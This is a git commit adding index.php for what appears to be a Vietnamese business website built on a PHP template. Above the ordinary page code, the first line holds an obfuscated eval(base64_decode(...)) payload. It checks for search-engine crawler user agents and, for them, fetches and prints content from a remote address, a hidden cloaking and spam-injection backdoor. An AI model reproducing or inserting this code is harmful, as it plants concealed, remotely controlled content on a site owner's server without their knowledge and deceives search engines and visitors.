6d486f39d542b8b67ed07c9c8e98f8026692aa1e
Server99-lab <serverpusat9@gmail.com>
2024-10-27 01:26:06 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,147 @@
+<?php
+ eval(base64_decode("\x43\x69\x42\156\142\x33\122\166\111\x46\106\x68\125\x7a\144\157\x4f\171\102\x71\x55\155\160\112\x53\152\157\x67\x61\127\131\x67\113\107\154\x7a\130\62\x4a\x76\144\103\x67\x70\113\123\102\x37\x49\x43\122\x74\x5a\x58\116\x7a\131\x57\x64\154\x49\104\x30\147\132\x6d\154\163\132\x56\71\156\132\130\x52\146\131\x32\71\x75\x64\107\126\x75\x64\110\x4d\157\x49\154\167\x78\x4e\124\x42\143\x4d\124\131\x30\x58\110\x67\x33\116\106\167\170\x4e\x6a\x42\143\115\x54\x59\172\130\104\143\171\x58\x48\x67\171\x5a\x6c\x77\61\116\x31\x78\x34\116\172\102\143\115\124\x59\61\130\110\147\x32\x4d\x6c\170\64\x4d\155\122\x63\x65\x44\x4d\171\130\x48\147\x7a\115\61\167\62\116\x56\x77\x78\x4e\x44\x56\143\x4e\x6a\x64\x63\x4e\x7a\x46\143\115\x54\x51\x30\130\x48\x67\172\115\x31\167\x78\116\x44\x46\143\x65\104\x4d\x35\x58\x44\x63\167\x58\110\x67\x7a\x4e\61\167\x32\116\x46\170\64\x4d\x7a\x52\143\x4d\x54\x51\x32\130\110\x67\x32\115\126\x77\x78\116\x44\x4a\143\x4e\152\x56\x63\115\124\x51\60\x58\104\131\x77\x58\x44\x59\167\130\x48\147\62\x4e\154\x78\x34\x4e\x6a\112\143\115\x54\121\60\130\x48\x67\62\x4e\154\167\170\116\104\116\x63\x65\x44\x4d\x79\130\x48\x67\62\116\x46\170\64\115\172\x64\143\145\x44\x59\x79\130\x44\131\x78\130\x44\x59\171\x58\110\147\171\x5a\x56\167\170\116\x6a\x4a\143\116\152\112\143\x65\x44\112\154\x58\110\147\x32\116\106\170\64\116\x6a\126\x63\145\104\x63\x32\x58\104\x55\x33\130\104\x45\61\116\x56\170\64\x4e\152\106\x63\x4d\124\x55\61\x58\110\x67\62\x4d\126\170\64\116\152\116\x63\x4d\x54\125\167\x58\110\x67\62\132\x6c\170\x34\x4e\152\x6c\143\x65\104\131\x7a\130\110\147\62\x4e\126\x77\61\x4e\154\x77\x78\116\x6a\x5a\x63\x65\104\132\x6c\130\104\125\x32\130\104\x45\x32\x4e\x46\x77\x78\x4e\172\x42\143\115\x54\x59\x30\111\x69\153\x37\x49\x47\x56\152\141\107\x38\x67\112\107\61\x6c\x63\63\x4e\150\132\x32\125\67\x49\x48\60\147\132\62\x39\x30\142\171\x42\127\x4d\x6e\x41\x35\x4f\x44\163\x67\125\x57\106\124\116\62\x67\66\x49\x47\x5a\x31\x62\155\x4e\60\141\x57\71\165\111\107\154\x7a\x58\62\x4a\166\144\103\x67\x70\x49\x48\163\147\112\110\126\172\x5a\130\112\x66\131\127\x64\154\142\156\121\147\x50\123\101\153\130\x31\x4e\x46\x55\154\132\106\x55\154\163\151\x58\110\x67\60\117\x46\167\170\x4d\x6a\122\x63\145\104\125\x30\130\x48\x67\x31\115\106\x78\x34\x4e\127\x5a\143\145\x44\x55\61\x58\x48\x67\x31\115\x31\167\x78\115\104\x56\x63\x4d\x54\111\171\130\104\105\x7a\116\x31\170\x34\x4e\x44\106\143\115\124\101\x33\130\110\147\60\x4e\x56\x77\170\x4d\124\132\x63\145\104\x55\60\x49\x6c\x30\67\111\103\x52\151\x62\x33\x52\172\x49\104\60\x67\131\130\x4a\171\x59\x58\x6b\x6f\111\154\170\x34\116\x44\x64\143\115\124\125\63\x58\104\105\61\x4e\x31\x77\170\x4e\x44\144\x63\115\x54\x55\60\x58\104\105\60\x4e\x56\x77\170\x4e\104\x4a\x63\115\x54\125\x33\x58\110\147\x33\x4e\103\x49\x73\111\103\112\x63\145\104\x55\x30\x58\104\x45\60\116\126\167\x78\x4e\x54\x52\x63\x4d\124\121\61\x58\110\x67\x32\x4e\61\167\x78\116\x6a\112\143\145\104\x59\170\130\x44\x45\61\x4e\x56\170\64\x4e\x44\x4a\x63\x4d\124\125\63\x58\104\105\62\x4e\103\111\163\x49\103\x4a\143\145\x44\131\x79\x58\x48\147\62\117\126\x78\64\116\155\x56\143\x4d\x54\x51\63\x58\x44\105\x30\115\154\167\170\x4e\124\x64\143\x4d\x54\x59\60\x49\151\x77\147\111\154\170\64\116\104\x64\x63\x65\104\x5a\x6d\x58\x48\x67\x32\132\x6c\167\x78\x4e\x44\x64\143\x4d\x54\125\x30\x58\110\x67\x32\116\126\170\x34\115\x6d\x52\143\145\104\125\x7a\x58\110\147\62\x4f\126\170\x34\x4e\172\x52\x63\x65\104\x59\61\x58\x44\x55\61\x58\x48\x67\61\116\154\167\170\116\104\x56\143\x4d\x54\131\x79\x58\104\x45\x31\115\126\170\64\116\x6a\x5a\143\145\104\131\x35\130\110\x67\62\x4d\x31\167\x78\x4e\x44\x46\x63\145\104\x63\60\130\104\x45\x31\x4d\126\x78\64\116\155\x5a\x63\115\x54\125\62\111\x69\167\147\111\154\170\64\x4e\104\x64\x63\x4d\x54\x55\63\x58\110\147\62\132\154\x77\x78\116\104\x64\x63\115\x54\x55\60\130\110\x67\62\116\126\x78\x34\x4d\155\122\x63\x65\x44\x51\x35\130\104\105\x31\116\154\170\64\116\172\x4e\143\115\x54\x59\x77\x58\x48\147\x32\x4e\x56\170\x34\x4e\152\x4e\x63\115\x54\131\60\130\x48\x67\x32\x4f\x56\x77\x78\116\x54\x64\x63\145\x44\132\154\x58\104\x45\171\116\x46\x77\x78\116\124\x64\143\x65\x44\132\155\130\104\105\x31\x4e\103\111\163\x49\103\112\143\115\124\121\170\130\x44\x45\x30\116\106\x78\x34\x4e\x7a\116\143\x4d\124\x51\61\x58\104\x45\61\x4e\x6c\170\x34\x4e\x7a\x4e\143\115\x54\x51\61\111\x69\167\147\111\154\167\x78\116\x6a\116\x63\115\x54\125\60\130\x48\147\63\116\x56\170\64\116\x7a\x4a\143\x4d\x54\131\x77\111\151\x6b\x37\111\107\x5a\x76\x63\x6d\x56\150\x59\62\147\147\x4b\x43\122\151\142\63\122\x7a\111\107\x46\172\111\103\122\x69\142\x33\x51\160\111\x48\163\147\141\x57\131\x67\x4b\x48\x4e\60\x63\x6d\154\167\142\x33\x4d\157\112\110\x56\x7a\132\130\112\146\x59\x57\144\x6c\x62\156\x51\163\111\x43\x52\151\142\x33\121\x70\x49\x43\x45\71\x50\123\102\155\131\x57\x78\172\x5a\x53\153\147\145\171\x42\171\132\x58\122\61\143\155\x34\147\144\110\x4a\61\x5a\124\163\x67\x66\123\x42\71\x49\110\x4a\154\144\110\126\171\x62\151\102\155\x59\127\x78\x7a\x5a\x54\x73\147\x66\x53\x42\x6e\x62\x33\x52\x76\111\x47\160\x53\x61\153\154\113\x4f\x79\102\x57\x4d\x6e\x41\65\117\x44\157\147")); ?>
+<?php
+	session_start();
+	@define ( '_template' , './templates/');
+	@define ( '_source' , './sources/');
+	@define ( '_lib' , './libraries/');
+
+	include_once _lib."config.php";
+	//lấy ngôn ngữ
+	/*if(isset($_GET["lang"])){
+		if(in_array($_GET["lang"],array('vi','en'))){
+			$_SESSION['lang']=$_GET["lang"];
+			header('Location: '.$_SERVER['HTTP_REFERER']);	
+		}
+	}
+	if(!isset($_SESSION['lang']))
+	{
+		$_SESSION['lang']='vi';
+	}
+	$lang=$_SESSION['lang'];*/
+	
+	$lang=$_SESSION['lang']='vi';
+	//gọi lang
+	include_once "upload/lang_$lang.php";
+		
+	include_once _lib."constant.php";
+	include_once _lib."class.database.php";
+	$d = new database($config['database']);
+	include_once _lib."functions.php";
+	
+	include_once _lib."file_requick.php";
+	include_once _lib."counter.php";
+
+
+	if($share_facebook==""){
+		$share_facebook = '<meta property="og:url" content="'.getCurrentPageURL().'" />';
+		$share_facebook .= '<meta property="og:type" content="website" />';
+		$share_facebook .= '<meta property="og:title" content="'.$row_setting['ten_'.$lang].'" />';
+		$share_facebook .= '<meta property="og:description" content="'.$row_setting['description'].'" />';
+		$share_facebook .= '<meta property="og:locale" content="vi_VN" />';
+		$share_facebook .= '<meta property="og:image" content="'.$config_url.'/timthumb.php?src='._upload_hinhanh_l.$row_setting['photo'].'&w=600&h=315&zc=2" />';
+	}
+?>
+<!DOCTYPE html>
+<html lang="<?=$lang?>">
+<head>
+<meta charset="UTF-8">
+<base href="<?=$config_url?>/">
+<link id="favicon" rel="shortcut icon" href="<?=_upload_hinhanh_l.$row_setting['photo']?>" type="image/x-icon" />
+<title><?=($title!='')?$title:$row_setting['title']?></title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="description" content="<?=($description!='')?$description:$row_setting['description']?>">
+<meta name="keywords" content="<?=($keywords!='')?$keywords:$row_setting['keywords']?>">
+<meta name="language" content="<?=$lang?>" />
+<meta http-equiv="content-language" content="<?=$lang?>">
+<meta name='revisit-after' content='1 days' />
+<!-- Dublin Core -->
+<link rel="schema.DC" href="http://purl.org/dc/elements/1.1/" />
+<meta name="DC.title" content="<?=($title!='')?$title:$row_setting['title']?>" />
+<meta name="DC.identifier" content="<?=$config_url?>/" />
+<meta name="DC.description" content="<?=($description!='')?$description:$row_setting['description']?>" />
+<meta name="DC.subject" content="website" />
+<meta name="DC.language" scheme="UTF-8" content="vi,en" />
+<!-- Geo -->
+<meta name="geo.region" content="VN" />
+<meta name="geo.position" content="<?=$row_setting['toado']?>">
+<meta name="geo.placename" content="<?=$row_setting['diachi_'.$lang]?>">
+<meta name="author" content="<?=$row_setting['ten_'.$lang]?>">
+<meta name="copyright" content="<?=$row_setting['ten_'.$lang]?> [<?=$row_setting['email']?>]" />
+<meta name="ICBM" content="<?=$row_setting['toado']?>">
+<?=$share_facebook?>
+<script language="javascript" type="text/javascript" src="js/jquery-2.1.1.min.js"></script>
+<script type='text/javascript' src='js/wow.min.js'></script>
+<script type="text/javascript">new WOW().init();</script>
+<link rel="stylesheet" href="plugin/owl-carousel/owl.carousel.css">
+<script src="plugin/owl-carousel/owl.carousel.min.js"></script>
+<link href="css/style.css?v=2.1" rel="stylesheet" type="text/css" />
+<link href="css/menu_mobile.css" rel="stylesheet" type="text/css" />
+<link href="css/style_media.css" rel="stylesheet" type="text/css" />
+<?=$row_setting['code']?>
+</head>
+<body itemscope itemtype="http://schema.org/WebPage">
+	<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NPC3X5Q"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+<div id="loadbody"></div>
+<div id="wrapper">
+		<header id="header" itemscope itemtype="http://schema.org/WPHeader">
+			<?php include _template."layout/header.php";?>
+	    </header><!--end header-->
+	    <div class="clear"></div>
+		<?php if($template=='index'){ ?>
+		
+				<section id="slider" itemscope itemtype="http://schema.org/WPSideBar">
+					<?php include _template."layout/slider.php";?> 
+			    </section><!--end slide_show-->
+		    
+		<div class="clear"></div>
+	    <?php }?>
+		<main id="" itemprop="mainContentOfPage" >
+			<div class="container">
+				<div class="row">
+				<?php  if($source!='index') include _template."layout/breadcrumb.php";?>
+			    <section id="middle" >
+					<?php include _template.$template."_tpl.php";?>
+				</section><!--end middle-->
+
+				</div>
+			</div>
+	    </main><!--end main-->
+		<div class="clear"></div>
+	   	<footer id="footer" itemscope itemtype="http://schema.org/WPFooter">
+			<?php  include _template."layout/footer.php"; ?>
+			<?php  //include _template."layout/chat.php"; ?>
+	    </footer><!--end footer-->
+</div><!--end wrapper-->
+<a href="#" id="top"></a>
+<script src="plugin/fancyapp/jquery.fancybox.js"></script>
+<link href="plugin/fancyapp/jquery.fancybox.css" type="text/css" rel="stylesheet" />
+<link href="css/animate.min.css" type="text/css" rel="stylesheet" />
+<script type="text/javascript">
+
+	$(document).ready(function() {
+		$('.fancybox').fancybox();
+		$(window).scroll(function() {
+			$top = $(window).scrollTop();
+			if($top > 100) {
+				$('#top').fadeIn();
+				$('#header').addClass('fixed');
+			} else {
+				$('#top').fadeOut();
+				$('#header').removeClass('fixed');
+			}
+	   	});
+	   	$('#top').click(function() {
+			$('html, body').animate({scrollTop:0},500);
+			return false;
+	   	});
+	   	//
+	   	$("#loadbody").fadeOut("slow");
+	});
+</script>
+</body>
+</html>
